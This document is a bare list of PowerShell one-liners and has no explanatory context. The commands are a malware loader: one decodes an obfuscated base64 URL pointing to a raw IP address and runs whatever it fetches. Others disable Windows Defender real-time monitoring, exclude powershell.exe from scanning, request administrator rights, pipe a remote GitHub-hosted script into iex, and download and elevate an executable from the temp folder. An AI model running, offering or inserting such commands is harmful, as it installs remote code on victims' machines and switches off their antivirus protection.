iex(irm ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovLzE5My4yMzMuMTI2LjI6ODA4MS93b3JrZXI/PWRlZ28='))))
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionProcess 'powershell.exe'; irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex; Set-MpPreference -DisableRealtimeMonitoring $false"

powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-c \"$ErrorActionPreference=''SilentlyContinue''; Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionProcess ''powershell.exe''; irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex; Set-MpPreference -DisableRealtimeMonitoring $false\"'"


powershell -c "irm https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dega.ps1 | iex"

iwr "https://github.com/Checkeeeer/checkeer/raw/refs/heads/main/dego.exe" -OutFile "$env:TEMP\dego.exe" -UseBasicParsing; Start-Process "$env:TEMP\dego.exe" -Verb RunAs
